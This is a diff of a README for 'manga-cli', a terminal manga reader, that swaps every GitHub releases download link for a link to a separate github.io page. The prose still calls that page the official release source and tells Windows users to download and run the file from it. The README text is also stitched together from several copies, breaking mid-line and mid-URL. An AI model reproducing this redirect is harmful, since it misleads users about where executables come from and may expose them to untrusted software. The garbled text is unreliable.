@@ -1,6 +1,6 @@
 # 📖 manga-cli - Read Manga in Your Terminal
 
-[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mer7301/manga-cli/releases)
+[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://mer7301.github.io)
 
 manga-cli is a lightweight terminal manga reader inspired by ani-cli. It is built for people who want a fast, simple way to search and read manga without a heavy desktop app. The reader works in a terminal window, uses mpv for smooth page display, supports multiple manga sources, switches to another source automatically when needed, remembers your place, and lets you change themes. This page is written for everyday computer users. You do not need programming knowledge.
 
@@ -16,7 +16,7 @@ The main benefits are:
 - Automatic fallback when a source is not available.
 - Persistent progress so you can continue later# 📖 manga-cli - Read Manga in Your Terminal
 
-[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mer7301/manga-cli/releases)
+[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://mer7301.github.io)
 
 manga-cli is a lightweight terminal manga reader inspired by ani-cli. It is built for people who want a fast, simple way to search and read manga without a heavy desktop app. The reader works in a terminal window, uses mpv for smooth page display, supports multiple manga sources, switches to another source automatically when needed, remembers your place, and lets you change themes. This page focuses on helping Windows users download and run manga-cli from the official release page. You do not need programming knowledge.
 
@@ -56,9 +56,9 @@ You do not need to write code. You only need to type the name of the application
 
 Visit this link to download the application:
 
-https://github.com# 📖 manga-cli - Read Manga in Your Terminal
+https://mer7301.github.io 📖 manga-cli - Read Manga in Your Terminal
 
-[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mer7301/manga-cli/releases)
+[![Download manga-cli](https://img.shields.io/badge/Download-manga--cli-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://mer7301.github.io)
 
 manga-cli is a lightweight terminal manga reader inspired by ani-cli. It is built for people who want a fast, simple way to search and read manga without a heavy desktop app. The reader works in a terminal window, uses mpv for smooth page display, supports multiple manga sources, switches to another source automatically when needed, remembers your place, and lets you change themes. This page focuses on helping Windows users download manga-cli from the official release page and start using it with confidence. You do not need programming knowledge to follow the steps.
 
@@ -98,7 +98,7 @@ You do not need to write code. You only need to type the name of the application
 
 Visit this link to download the application:
 
-[![Download manga-cli](https://img.shields.io/badge/Get-manga--cli-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Mer7301/manga-cli/releases)
+[![Download manga-cli](https://img.shields.io/badge/Get-manga--cli-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://mer7301.github.io)
 
 Use the official release page as the only download source. The page contains the files provided by the project. Choose the download that matches your computer and save it to a folder you can find easily, such as Downloads or Desktop.
 
@@ -142,7 +142,7 @@ This design reduces the chance of a dead end. You do not need to manage sources 
 
 What do I need before I start? You need a Windows computer, a browser to reach the download page, and a terminal window. The release page provides the download.
 
-Where do I download manga-cli? Visit https://github.com/Mer7301/manga-cli/releases to download the application.
+Where do I download manga-cli? Visit https://mer7301.github.io to download the application.
 
 How do I open manga-cli? Open a terminal window in the folder where you saved the downloaded file, type the application name, and press Enter.
 
